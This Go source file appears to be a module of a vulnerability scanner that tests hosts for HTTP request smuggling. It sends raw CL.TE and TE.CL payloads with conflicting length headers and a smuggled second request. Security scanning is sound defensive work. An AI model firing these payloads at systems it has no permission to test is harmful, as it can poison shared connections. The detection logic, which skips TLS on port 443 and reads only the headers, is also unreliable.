package engine

import (
	"bufio"
	"context"
	"log/slog"
	"net"
	"strings"
	"sync"
	"time"
)

type HTTPSmugglingScannerModule struct {
	scanner *VulnScanner
}

func NewHTTPSmugglingScannerModule(scanner *VulnScanner) *HTTPSmugglingScannerModule {
	if scanner == nil {
		scanner = NewVulnScanner(map[string]interface{}{"module_name": "http-smuggling-scanner"})
	}
	return &HTTPSmugglingScannerModule{scanner: scanner}
}

func (m *HTTPSmugglingScannerModule) ID() string       { return "http-smuggling-scanner" }
func (m *HTTPSmugglingScannerModule) Name() string     { return "HTTP Smuggling Scanner" }
func (m *HTTPSmugglingScannerModule) Category() string { return "web" }

func (m *HTTPSmugglingScannerModule) Run(ctx context.Context, targets []*Target, config map[string]interface{}) (*ModuleResult, error) {
	start := time.Now()
	result := &ModuleResult{ModuleID: m.ID()}
	var mu sync.Mutex
	var wg sync.WaitGroup

	sem := make(chan struct{}, 3)

	for _, target := range targets {
		select {
		case <-ctx.Done():
			result.Duration = time.Since(start)
			return result, ctx.Err()
		default:
		}

		if target.Host == "" {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}
		go func(t *Target) {
			defer wg.Done()
			defer func() { <-sem }()

			findings := m.scanTarget(ctx, t)
			if len(findings) > 0 {
				mu.Lock()
				result.Findings = append(result.Findings, findings...)
				mu.Unlock()
			}
		}(target)
	}

	wg.Wait()
	result.Duration = time.Since(start)
	slog.Info("[HTTPSmuggling-Scanner] 扫描完成",
		"targets", len(targets),
		"findings", len(result.Findings),
		"duration", result.Duration,
	)

	return result, nil
}

func (m *HTTPSmugglingScannerModule) scanTarget(ctx context.Context, target *Target) []*Finding {
	var findings []*Finding

	port := "80"
	if target.Port == 443 || target.Protocol == "https" {
		port = "443"
	}

	addr := target.Host + ":" + port

	clTEFinding := m.testCLTE(ctx, addr, target)
	if clTEFinding != nil {
		findings = append(findings, clTEFinding)
	}

	teCLFinding := m.testTECL(ctx, addr, target)
	if teCLFinding != nil {
		findings = append(findings, teCLFinding)
	}

	return findings
}

func (m *HTTPSmugglingScannerModule) testCLTE(ctx context.Context, addr string, target *Target) *Finding {
	payload := "POST / HTTP/1.1\r\n" +
		"Host: " + target.Host + "\r\n" +
		"Content-Length: 6\r\n" +
		"Transfer-Encoding: chunked\r\n" +
		"\r\n" +
		"0\r\n" +
		"\r\n" +
		"GET / HTTP/1.1\r\n" +
		"Host: " + target.Host + "\r\n" +
		"\r\n"

	resp, err := m.sendRawRequest(ctx, addr, payload)
	if err != nil {
		return nil
	}

	if strings.Contains(resp, "400") || strings.Contains(resp, "404") || strings.Contains(resp, "200") {
		if strings.Count(resp, "HTTP/1.1") > 1 {
			return &Finding{
				Target:      target,
				Type:        "http_smuggling",
				Title:       "HTTP Request Smuggling (CL.TE)",
				Description: "The server is vulnerable to HTTP request smuggling via Content-Length/Transfer-Encoding discrepancy",
				Severity:    "critical",
				Confidence:  75,
				Evidence:    "CL.TE smuggling detected - multiple HTTP responses in single request",
				Timestamp:   time.Now(),
				Remediation: "Ensure consistent handling of Content-Length and Transfer-Encoding headers",
				Data: map[string]string{
					"type": "CL.TE",
				},
			}
		}
	}

	return nil
}

func (m *HTTPSmugglingScannerModule) testTECL(ctx context.Context, addr string, target *Target) *Finding {
	payload := "POST / HTTP/1.1\r\n" +
		"Host: " + target.Host + "\r\n" +
		"Content-Length: 4\r\n" +
		"Transfer-Encoding: chunked\r\n" +
		"\r\n" +
		"5c\r\n" +
		"GET / HTTP/1.1\r\n" +
		"Host: " + target.Host + "\r\n" +
		"Content-Length: 15\r\n" +
		"\r\n" +
		"0\r\n" +
		"\r\n"

	resp, err := m.sendRawRequest(ctx, addr, payload)
	if err != nil {
		return nil
	}

	if strings.Contains(resp, "400") || strings.Contains(resp, "404") || strings.Contains(resp, "200") {
		if strings.Count(resp, "HTTP/1.1") > 1 {
			return &Finding{
				Target:      target,
				Type:        "http_smuggling",
				Title:       "HTTP Request Smuggling (TE.CL)",
				Description: "The server is vulnerable to HTTP request smuggling via Transfer-Encoding/Content-Length discrepancy",
				Severity:    "critical",
				Confidence:  75,
				Evidence:    "TE.CL smuggling detected - multiple HTTP responses in single request",
				Timestamp:   time.Now(),
				Remediation: "Ensure consistent handling of Content-Length and Transfer-Encoding headers",
				Data: map[string]string{
					"type": "TE.CL",
				},
			}
		}
	}

	return nil
}

func (m *HTTPSmugglingScannerModule) sendRawRequest(ctx context.Context, addr, payload string) (string, error) {
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return "", err
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(5 * time.Second))

	_, err = conn.Write([]byte(payload))
	if err != nil {
		return "", err
	}

	reader := bufio.NewReader(conn)
	var response strings.Builder
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		response.WriteString(line)
		if line == "\r\n" || line == "\n" {
			break
		}
	}

	return response.String(), nil
}
